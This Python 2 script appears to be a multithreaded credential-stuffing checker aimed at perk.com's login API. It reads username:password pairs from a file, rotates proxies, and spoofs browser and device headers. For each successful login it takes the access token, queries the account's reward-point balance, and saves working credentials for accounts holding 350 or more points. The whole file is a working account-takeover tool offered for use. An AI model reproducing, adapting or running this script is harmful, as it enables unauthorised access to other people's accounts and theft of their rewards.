import requests
import re
import Queue
import random
import time
import codecs
from threading import Thread

requests.packages.urllib3.disable_warnings()

with codecs.open('Proxies Working.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
	
def check(q):
	s = requests.session()
	while True:
		c = q.get()
		user = c.split(':')[0]
		passw = c.split(':')[1]
		print 'Testing', user
		er = True
		while er:
			s.cookies.clear()
			try:
				#proxy = random.choice(proxies).strip()
				proxy = '127.0.0.1:8888'
				prozy = {
					'http': proxy,
					'https': proxy
				}
				works = False
				headers = {
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
					'Accept-Language': 'en-US,en;q=0.8',
					'Access-Control-Request-Headers': 'content-type,device-info',
					'Access-Control-Request-Method': 'POST',
					'Referer': 'http://perk.com/home/',
					'Origin': 'https://perk.com'
				}
				r = s.options(
					'https://web-api.perk.com/v2/authentication/login',
					verify=False,
					proxies=prozy,
					timeout=16,
					headers=headers
				)
				headers['Content-Type'] = 'application/json;charset=UTF-8'
				headers['Referer'] = 'https://perk.com/'
				headers['Accept'] = 'application/json'
				headers['Device-Info'] = 'app_name=Perk Web;app_version=3c53a59;app_bundle_id=com.perk;product_identifier=perk_web;os_name=Windows;os_version=10;device_model=Firefox 57.0;device_manufacturer=Windows;device_resolution=1920x1080;desktop_id=71027ff9-3a72-461d-a1aa-558a5aac9777;'
				r = s.post(
					'https://web-api.perk.com/v2/authentication/login',
					json={"username":user,"password":passw,"grant_type":"password","product_identifier":"perk_web"},
					verify=False,
					proxies=prozy,
					timeout=16,
					headers=headers
				)
				if 'incorrect' in r.text:
					print user, 'does not work!'
					works = True
				elif 'status":"success' in r.text:
					works = True
					accesst = points = re.findall('access_token":"(.*?)"', r.text)[0]
					r = s.get(
								'https://api-v2.perk.com/v2/users/{0}.json?includes[]=address&includes[]=apptrailers'.format(accesst),
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					points = re.findall('available_perks":(.*?),', r.text)[0]
					print int(points)
					if int(points) >= 350:
						f = open("working.txt", "a")
						f.write('{2} - {0}:{1}\n'.format(user, passw, points))
						f.close()
					print user, 'works!'
				
				if not 'An error has occurred. ' in r.text:
					time.sleep(1)
					er = False
					
				if works:
					f = open("checked.txt", "a")
					f.write('{0}:{1}\n'.format(user, passw))
					f.close()
				q.task_done()
			except Exception, e:
				print e
				proxy = random.choice(proxies)
	
def main():
	with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
		users = f.readlines()
	with codecs.open('checked.txt', 'r', encoding='utf-8') as f:
		checked = f.readlines()
	queue = Queue.Queue()
	
	for _ in range(int(26)):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	for user in users:
		if not user.strip().encode('ascii', 'ignore').split(':')[0] in checked:
			queue.put(user.strip().encode('ascii', 'ignore'))
			
if __name__ == '__main__':
	main()